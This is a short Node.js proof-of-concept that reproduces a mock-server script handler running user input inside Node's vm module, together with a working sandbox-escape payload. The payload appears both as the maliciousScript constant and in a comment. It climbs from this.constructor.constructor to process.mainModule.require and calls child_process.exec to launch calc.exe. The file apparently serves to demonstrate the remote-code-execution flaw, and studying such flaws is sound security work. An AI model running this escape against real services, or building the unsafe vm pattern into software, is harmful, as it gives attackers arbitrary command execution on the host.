const mockjs = require('mockjs');
const vm = require('vm'); 
const readline = require('readline');


function questionAsync(prompt) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  return new Promise((resolve) => {
    rl.question(prompt, (input) => {
      rl.close();
      resolve(input.trim());
    });
  });
}
function Sandbox(sandbox, script) {
  try {
    const context = vm.createContext(sandbox);
    const code = new vm.Script(script);
    code.runInContext(context, { timeout: 3000 });
    return sandbox;
  } catch (err) {
    throw err;
  }
}
function handleMockScript(script) {
  const context = {
    ctx: {
      header: {},
      query: {},
      request: { body: {} }
    },
    mockJson: {},
    resHeader: {},
    httpCode: 200,
    delay: 0
  };

  const sandbox = {
    header: context.ctx.header,
    query: context.ctx.query,
    body: context.ctx.request.body,
    mockJson: context.mockJson,
    params: {},
    resHeader: context.resHeader,
    httpCode: context.httpCode,
    delay: context.delay,
    Random: mockjs.Random
  };
  Sandbox(sandbox, script);
  return context;
}

const maliciousScript = `
  const sandbox = this;
  const FunctionConstructor = sandbox.constructor.constructor;
  const require = FunctionConstructor('return process.mainModule.require')();
  require('child_process').exec('calc.exe');
`;

async function main() {
    try {
        const userInput = await questionAsync('input:');
        /*
            const sandbox = this;
            const FunctionConstructor = sandbox.constructor.constructor;
            const require = FunctionConstructor('return process.mainModule.require')();
            require('child_process').exec('calc.exe');
        */
        const Script = userInput;
        handleMockScript(Script);
    }catch (err) {
        console.error('error:', err);
    }
}
main();
